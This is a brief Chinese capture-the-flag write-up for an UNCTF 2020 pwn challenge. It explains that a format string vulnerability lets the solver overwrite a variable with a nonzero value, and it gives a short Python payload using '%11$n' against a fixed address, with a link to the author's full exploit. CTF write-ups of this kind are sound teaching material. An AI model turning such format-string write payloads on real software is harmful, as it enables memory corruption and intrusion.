
## 你真的会pwn嘛？
- 题目描述
- 题目附件：[fmt](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/unctf2020/pwn/fmt/fmt)
- 考察点：格式化字符串漏洞
- 难度：签到

### 程序分析
覆盖变量为非零值即可

### 解题思路
``` python
target = 0x60107C
sl('AAA%11$n'+p64(target))
```

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/unctf2020/pwn/fmt) 

